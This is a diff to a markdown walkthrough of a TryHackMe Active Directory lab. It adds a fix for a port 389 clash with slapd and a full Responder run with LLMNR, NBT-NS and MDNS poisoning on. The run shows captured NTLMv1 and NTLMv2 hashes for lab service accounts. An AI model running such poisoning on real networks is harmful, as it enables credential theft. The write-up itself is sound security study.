@@ -618,6 +618,101 @@ On THM, you run:
 ```
 sudo responder -I breachad
 ```
+### Note if slapd is running it is on port 389 so disable as two errors will appear on port 389
+I had discovered xRDP running on test machine but that should not have mattered
+Just check and stop the process for now and retry:
+```
+sudo systemctl stop slapd
+sudo systemctl status slapd
+```
+On retry I also tested LDAP and responder pics that up to
+
+```
+┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Learning_modules/Breaching_Active_Directory]
+└─$ sudo responder -I breachad 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+
+[*] Tips jar:
+    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
+    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+    DHCPv6                     [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [breachad]
+    Responder IP               [10.150.70.22]
+    Responder IPv6             [fe80::5f90:7dd:2c6b:49f8]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-EOUEOGD8N76]
+    Responder Domain Name      [B6OM.LOCAL]
+    Responder DCE-RPC Port     [47604]
+
+[*] Version: Responder 3.2.2.0
+[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
+
+[+] Listening for events...                                                                                           
+
+[!] Error starting TCP server on port 3389, check permissions or other servers running.
+[LDAP] NTLMv1-SSP Client   : 10.200.70.201
+[LDAP] NTLMv1-SSP Hostname : THMIIS
+[LDAP] NTLMv1-SSP Username : za.tryhackme.com\svcLDAP
+[LDAP] NTLMv1-SSP Hash     : svcLDAP::za.tryhackme.com:43C996D16995092900000000000000000000000000000000:A9768495C34BDDAF7966DE3AE222963329C38FF5BA1012BC:63742039474d2ce1                                                                   
+[SMB] NTLMv2-SSP Client   : 10.200.70.202
+[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
+[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:84140fdd682af1f7:FD777C8FAF134B10880C00CE2B2F1B0E:0101000000000000800A76C009F7DC012470B1C35C5F54D10000000002000800420036004F004D0001001E00570049004E002D0045004F00550045004F004700440038004E003700360004003400570049004E002D0045004F00550045004F004700440038004E00370036002E00420036004F004D002E004C004F00430041004C0003001400420036004F004D002E004C004F00430041004C0005001400420036004F004D002E004C004F00430041004C0007000800800A76C009F7DC01060004000200000008003000300000000000000000000000002000008B10483D0820E576E7D40606685D7FC037F2E02C770833867BAD88BB851E87DD0A001000000000000000000000000000000000000900220063006900660073002F00310030002E003100350030002E00370030002E00320032000000000000000000      
+
+```
+
+
 Because you’re on a VPN, poisoning is limited — THM simulates an authentication attempt every ~30 minutes.
 
 When a victim authenticates, you get output like:
